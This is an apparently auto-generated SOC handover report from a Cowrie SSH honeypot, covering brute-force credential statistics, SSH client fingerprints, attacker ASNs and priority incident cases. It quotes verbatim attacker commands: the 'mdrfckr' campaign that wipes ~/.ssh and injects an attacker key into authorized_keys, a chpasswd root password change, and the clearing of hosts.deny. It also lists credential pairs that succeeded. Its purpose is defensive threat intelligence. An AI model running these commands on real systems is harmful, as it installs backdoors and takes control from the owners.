# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-23 |
| **Generated At** | 2026-04-23T06:09:24Z |
| **Shift Time** | 06:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **201** |
| Confirmed Threats | **179** |
| False Positives Filtered | **22** (10.9%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **12** |
| High Severity Cases | **61** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **140** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **142** |
| Unique Credential Pairs | **80** |
| Unique Usernames | **32** |
| Unique Passwords | **79** |
| Successful Auth Pairs | **37** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 62 |
| `345gs5662d34` | 28 |
| `ubuntu` | 9 |
| `ftpuser` | 6 |
| `admin1234` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 28 |
| `3245gs5662d34` | 28 |
| `admin1234` | 3 |
| `123456` | 2 |
| `spider` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `3245gs5662d34` | 28 |
| `admin1234` | `admin1234` | 3 |
| `spider` | `spider` | 2 |
| `root` | `Qwertyuiop` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test123` | `43.134.94.132` | 2026-04-23T03:10:51 |
| `root` | `Qwertyuiop` | `180.76.143.203` | 2026-04-23T03:48:07 |
| `root` | `Aa123123..` | `180.76.143.203` | 2026-04-23T03:49:21 |
| `root` | `------fuck------` | `113.200.121.70` | 2026-04-23T03:59:33 |
| `root` | `P` | `101.36.104.242` | 2026-04-23T04:34:18 |
| `root` | `zaq1..` | `103.183.74.182` | 2026-04-23T04:55:37 |
| `root` | `3245gs5662d34` | `103.183.74.182` | 2026-04-23T04:55:42 |
| `root` | `Qwertyui1234567` | `103.183.74.182` | 2026-04-23T04:56:45 |
| `root` | `1qw23er45ty6` | `103.183.74.182` | 2026-04-23T05:00:01 |
| `root` | `Aa@1234567` | `103.183.74.182` | 2026-04-23T05:01:11 |
| `root` | `sa` | `103.183.74.182` | 2026-04-23T05:02:20 |
| `root` | `P@ssw0rd2025` | `103.183.74.182` | 2026-04-23T05:04:37 |
| `root` | `ok` | `103.183.74.182` | 2026-04-23T05:05:57 |
| `root` | `Qwertyuiop` | `103.183.74.182` | 2026-04-23T05:12:23 |
| `root` | `Aa123123..` | `103.183.74.182` | 2026-04-23T05:14:35 |
| `root` | `root2018@@` | `103.183.74.182` | 2026-04-23T05:17:50 |
| `root` | `12344321` | `103.183.74.182` | 2026-04-23T05:20:08 |
| `root` | `qwerqwer1234` | `165.154.20.216` | 2026-04-23T05:23:42 |
| `root` | `3245gs5662d34` | `165.154.20.216` | 2026-04-23T05:23:45 |
| `root` | `qa2ws3ed!` | `165.154.20.216` | 2026-04-23T05:25:36 |
| `root` | `Root25!` | `165.154.20.216` | 2026-04-23T05:26:30 |
| `root` | `a12345678A` | `165.154.20.216` | 2026-04-23T05:29:02 |
| `root` | `root123456789!!` | `165.154.20.216` | 2026-04-23T05:30:48 |
| `root` | `Teste123` | `47.80.24.238` | 2026-04-23T05:31:50 |
| `root` | `3245gs5662d34` | `47.80.24.238` | 2026-04-23T05:31:54 |
| `root` | `qq112233` | `165.154.20.216` | 2026-04-23T05:33:23 |
| `root` | `qwer!123456` | `47.80.24.238` | 2026-04-23T05:34:17 |
| `root` | `Qazwsx01!@` | `47.80.24.238` | 2026-04-23T05:35:58 |
| `root` | `1qaz@WSX@@` | `165.154.20.216` | 2026-04-23T05:36:10 |
| `root` | `root123456789@@` | `47.80.24.238` | 2026-04-23T05:36:50 |
| `root` | `ZAQ!2wsx2019#` | `165.154.20.216` | 2026-04-23T05:39:14 |
| `root` | `7ujm@@` | `47.80.24.238` | 2026-04-23T05:41:02 |
| `root` | `QWERT123` | `165.154.20.216` | 2026-04-23T05:41:08 |
| `root` | `123456_asd` | `47.80.24.238` | 2026-04-23T05:42:42 |
| `root` | `QA2ws3ed#$` | `165.154.20.216` | 2026-04-23T05:45:04 |
| `root` | `123456_asd` | `209.38.69.153` | 2026-04-23T05:56:26 |
| `root` | `3245gs5662d34` | `209.38.69.153` | 2026-04-23T05:56:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **201** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 171 |
| Go SSH scanner | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 100 | 5 |
| `03a80b21afa8...` | Modern SSH client | 50 | 6 |
| `4e066189c3bb...` | Generic scanner | 5 | 1 |
| `19532158b559...` | Mirai/variant | 3 | 1 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 100 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 50 | 6 | Modern SSH client |
| `95420f9d932d...` | libssh | 18 | 5 | — |
| `4e066189c3bb...` | Go SSH scanner | 5 | 1 | Generic scanner |
| `19532158b559...` | libssh | 3 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 28 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:WaqdJQTmPkdm"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.76.143.203`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `209.38.69.153`, `103.183.74.182`, `165.154.20.216`, `47.80.24.238`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **17** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS17882` | Univision LLC | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS132754` | Realtel Network Services Pvt Ltd | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (61)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-488332c7d5ac

| Field | Detail |
|---|---|
| **Source IP** | `43.134.94[.]132` |
| **First Seen** | 2026-04-23 03:10 |
| **Last Seen** | 2026-04-23 03:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 03:10:51` | `cowrie.session.connect` |
| `2026-04-23 03:10:51` | `cowrie.client.version` |
| `2026-04-23 03:10:51` | `cowrie.client.kex` |
| `2026-04-23 03:10:51` | `cowrie.login.success` |
| `2026-04-23 03:10:51` | `cowrie.session.params` |
| `2026-04-23 03:10:51` | `cowrie.command.input` |
| `2026-04-23 03:10:51` | `cowrie.log.closed` |
| `2026-04-23 03:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.94[.]132` to AbuseIPDB if not already reported
- [ ] Block `43.134.94[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0012a12a6008

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]203` |
| **First Seen** | 2026-04-23 03:48 |
| **Last Seen** | 2026-04-23 03:48 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WaqdJQTmPkdm"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 03:48:04` | `cowrie.session.connect` |
| `2026-04-23 03:48:04` | `cowrie.client.version` |
| `2026-04-23 03:48:05` | `cowrie.client.kex` |
| `2026-04-23 03:48:07` | `cowrie.login.success` |
| `2026-04-23 03:48:09` | `cowrie.session.params` |
| `2026-04-23 03:48:09` | `cowrie.command.input` |
| `2026-04-23 03:48:09` | `cowrie.command.failed` |
| `2026-04-23 03:48:10` | `cowrie.log.closed` |
| `2026-04-23 03:48:10` | `cowrie.session.params` |
| `2026-04-23 03:48:10` | `cowrie.command.input` |
| `2026-04-23 03:48:12` | `cowrie.session.file_download` |
| `2026-04-23 03:48:12` | `cowrie.log.closed` |
| `2026-04-23 03:48:24` | `cowrie.session.params` |
| `2026-04-23 03:48:24` | `cowrie.command.input` |
| `2026-04-23 03:48:24` | `cowrie.log.closed` |
| `2026-04-23 03:48:25` | `cowrie.session.params` |
| `2026-04-23 03:48:25` | `cowrie.command.input` |
| `2026-04-23 03:48:26` | `cowrie.log.closed` |
| `2026-04-23 03:48:27` | `cowrie.session.params` |
| `2026-04-23 03:48:27` | `cowrie.command.input` |
| `2026-04-23 03:48:27` | `cowrie.session.file_download` |
| `2026-04-23 03:48:27` | `cowrie.log.closed` |
| `2026-04-23 03:48:29` | `cowrie.session.params` |
| `2026-04-23 03:48:29` | `cowrie.command.input` |
| `2026-04-23 03:48:29` | `cowrie.log.closed` |
| `2026-04-23 03:48:30` | `cowrie.session.params` |
| `2026-04-23 03:48:30` | `cowrie.command.input` |
| `2026-04-23 03:48:30` | `cowrie.log.closed` |
| `2026-04-23 03:48:31` | `cowrie.session.params` |
| `2026-04-23 03:48:31` | `cowrie.command.input` |
| `2026-04-23 03:48:31` | `cowrie.command.input` |
| `2026-04-23 03:48:32` | `cowrie.log.closed` |
| `2026-04-23 03:48:33` | `cowrie.session.params` |
| `2026-04-23 03:48:33` | `cowrie.command.input` |
| `2026-04-23 03:48:33` | `cowrie.log.closed` |
| `2026-04-23 03:48:35` | `cowrie.session.params` |
| `2026-04-23 03:48:35` | `cowrie.command.input` |
| `2026-04-23 03:48:35` | `cowrie.log.closed` |
| `2026-04-23 03:48:35` | `cowrie.session.params` |
| `2026-04-23 03:48:35` | `cowrie.command.input` |
| `2026-04-23 03:48:36` | `cowrie.log.closed` |
| `2026-04-23 03:48:37` | `cowrie.session.params` |
| `2026-04-23 03:48:37` | `cowrie.command.input` |
| `2026-04-23 03:48:37` | `cowrie.log.closed` |
| `2026-04-23 03:48:38` | `cowrie.session.params` |
| `2026-04-23 03:48:38` | `cowrie.command.input` |
| `2026-04-23 03:48:38` | `cowrie.log.closed` |
| `2026-04-23 03:48:40` | `cowrie.session.params` |
| `2026-04-23 03:48:40` | `cowrie.command.input` |
| `2026-04-23 03:48:40` | `cowrie.log.closed` |
| `2026-04-23 03:48:41` | `cowrie.session.params` |
| `2026-04-23 03:48:41` | `cowrie.command.input` |
| `2026-04-23 03:48:42` | `cowrie.log.closed` |
| `2026-04-23 03:48:44` | `cowrie.session.params` |
| `2026-04-23 03:48:44` | `cowrie.command.input` |
| `2026-04-23 03:48:44` | `cowrie.log.closed` |
| `2026-04-23 03:48:46` | `cowrie.session.params` |
| `2026-04-23 03:48:46` | `cowrie.command.input` |
| `2026-04-23 03:48:46` | `cowrie.log.closed` |
| `2026-04-23 03:48:48` | `cowrie.session.params` |
| `2026-04-23 03:48:48` | `cowrie.command.input` |
| `2026-04-23 03:48:49` | `cowrie.log.closed` |
| `2026-04-23 03:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]203` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c342b0937ca

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]203` |
| **First Seen** | 2026-04-23 03:49 |
| **Last Seen** | 2026-04-23 03:54 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0Yn8s9sTQD1r"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 03:49:17` | `cowrie.session.connect` |
| `2026-04-23 03:49:17` | `cowrie.client.version` |
| `2026-04-23 03:49:18` | `cowrie.client.kex` |
| `2026-04-23 03:49:21` | `cowrie.login.success` |
| `2026-04-23 03:49:23` | `cowrie.session.params` |
| `2026-04-23 03:49:23` | `cowrie.command.input` |
| `2026-04-23 03:49:23` | `cowrie.command.failed` |
| `2026-04-23 03:49:25` | `cowrie.log.closed` |
| `2026-04-23 03:49:26` | `cowrie.session.params` |
| `2026-04-23 03:49:26` | `cowrie.command.input` |
| `2026-04-23 03:49:26` | `cowrie.session.file_download` |
| `2026-04-23 03:49:26` | `cowrie.log.closed` |
| `2026-04-23 03:49:39` | `cowrie.session.params` |
| `2026-04-23 03:49:39` | `cowrie.command.input` |
| `2026-04-23 03:49:39` | `cowrie.log.closed` |
| `2026-04-23 03:49:41` | `cowrie.session.params` |
| `2026-04-23 03:49:41` | `cowrie.command.input` |
| `2026-04-23 03:49:41` | `cowrie.log.closed` |
| `2026-04-23 03:49:42` | `cowrie.session.params` |
| `2026-04-23 03:49:42` | `cowrie.command.input` |
| `2026-04-23 03:49:42` | `cowrie.session.file_download` |
| `2026-04-23 03:49:42` | `cowrie.log.closed` |
| `2026-04-23 03:49:43` | `cowrie.session.params` |
| `2026-04-23 03:49:43` | `cowrie.command.input` |
| `2026-04-23 03:49:43` | `cowrie.log.closed` |
| `2026-04-23 03:49:45` | `cowrie.session.params` |
| `2026-04-23 03:49:45` | `cowrie.command.input` |
| `2026-04-23 03:49:46` | `cowrie.log.closed` |
| `2026-04-23 03:49:48` | `cowrie.session.params` |
| `2026-04-23 03:49:48` | `cowrie.command.input` |
| `2026-04-23 03:49:48` | `cowrie.command.input` |
| `2026-04-23 03:49:48` | `cowrie.log.closed` |
| `2026-04-23 03:49:49` | `cowrie.session.params` |
| `2026-04-23 03:49:49` | `cowrie.command.input` |
| `2026-04-23 03:49:50` | `cowrie.log.closed` |
| `2026-04-23 03:49:51` | `cowrie.session.params` |
| `2026-04-23 03:49:51` | `cowrie.command.input` |
| `2026-04-23 03:49:51` | `cowrie.log.closed` |
| `2026-04-23 03:49:52` | `cowrie.session.params` |
| `2026-04-23 03:49:52` | `cowrie.command.input` |
| `2026-04-23 03:49:53` | `cowrie.log.closed` |
| `2026-04-23 03:49:54` | `cowrie.session.params` |
| `2026-04-23 03:49:54` | `cowrie.command.input` |
| `2026-04-23 03:49:54` | `cowrie.log.closed` |
| `2026-04-23 03:49:55` | `cowrie.session.params` |
| `2026-04-23 03:49:55` | `cowrie.command.input` |
| `2026-04-23 03:49:55` | `cowrie.log.closed` |
| `2026-04-23 03:49:57` | `cowrie.session.params` |
| `2026-04-23 03:49:57` | `cowrie.command.input` |
| `2026-04-23 03:49:57` | `cowrie.log.closed` |
| `2026-04-23 03:49:58` | `cowrie.session.params` |
| `2026-04-23 03:49:58` | `cowrie.command.input` |
| `2026-04-23 03:49:58` | `cowrie.log.closed` |
| `2026-04-23 03:50:02` | `cowrie.session.params` |
| `2026-04-23 03:50:02` | `cowrie.command.input` |
| `2026-04-23 03:50:03` | `cowrie.log.closed` |
| `2026-04-23 03:50:05` | `cowrie.session.params` |
| `2026-04-23 03:50:05` | `cowrie.command.input` |
| `2026-04-23 03:50:05` | `cowrie.log.closed` |
| `2026-04-23 03:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]203` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c72a4291e8

| Field | Detail |
|---|---|
| **Source IP** | `113.200.121[.]70` |
| **First Seen** | 2026-04-23 03:59 |
| **Last Seen** | 2026-04-23 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 03:59:33` | `cowrie.session.connect` |
| `2026-04-23 03:59:33` | `cowrie.client.version` |
| `2026-04-23 03:59:33` | `cowrie.client.kex` |
| `2026-04-23 03:59:33` | `cowrie.login.success` |
| `2026-04-23 03:59:34` | `cowrie.session.params` |
| `2026-04-23 03:59:34` | `cowrie.command.input` |
| `2026-04-23 03:59:34` | `cowrie.log.closed` |
| `2026-04-23 03:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.200.121[.]70` to AbuseIPDB if not already reported
- [ ] Block `113.200.121[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4febbe49d223

| Field | Detail |
|---|---|
| **Source IP** | `101.36.104[.]242` |
| **First Seen** | 2026-04-23 04:34 |
| **Last Seen** | 2026-04-23 04:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 04:34:16` | `cowrie.session.connect` |
| `2026-04-23 04:34:16` | `cowrie.client.version` |
| `2026-04-23 04:34:16` | `cowrie.client.kex` |
| `2026-04-23 04:34:18` | `cowrie.login.success` |
| `2026-04-23 04:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.104[.]242` to AbuseIPDB if not already reported
- [ ] Block `101.36.104[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73e7bed2ca51

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 04:55 |
| **Last Seen** | 2026-04-23 04:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 04:55:35` | `cowrie.session.connect` |
| `2026-04-23 04:55:35` | `cowrie.client.version` |
| `2026-04-23 04:55:36` | `cowrie.client.kex` |
| `2026-04-23 04:55:37` | `cowrie.login.success` |
| `2026-04-23 04:55:37` | `cowrie.session.params` |
| `2026-04-23 04:55:37` | `cowrie.command.input` |
| `2026-04-23 04:55:37` | `cowrie.command.failed` |
| `2026-04-23 04:55:37` | `cowrie.log.closed` |
| `2026-04-23 04:55:38` | `cowrie.session.params` |
| `2026-04-23 04:55:38` | `cowrie.command.input` |
| `2026-04-23 04:55:38` | `cowrie.session.file_download` |
| `2026-04-23 04:55:38` | `cowrie.log.closed` |
| `2026-04-23 04:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a04b7403a57

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 04:55 |
| **Last Seen** | 2026-04-23 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 04:55:41` | `cowrie.session.connect` |
| `2026-04-23 04:55:41` | `cowrie.client.version` |
| `2026-04-23 04:55:41` | `cowrie.client.kex` |
| `2026-04-23 04:55:42` | `cowrie.login.success` |
| `2026-04-23 04:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aabcb331bd9

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 04:56 |
| **Last Seen** | 2026-04-23 04:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
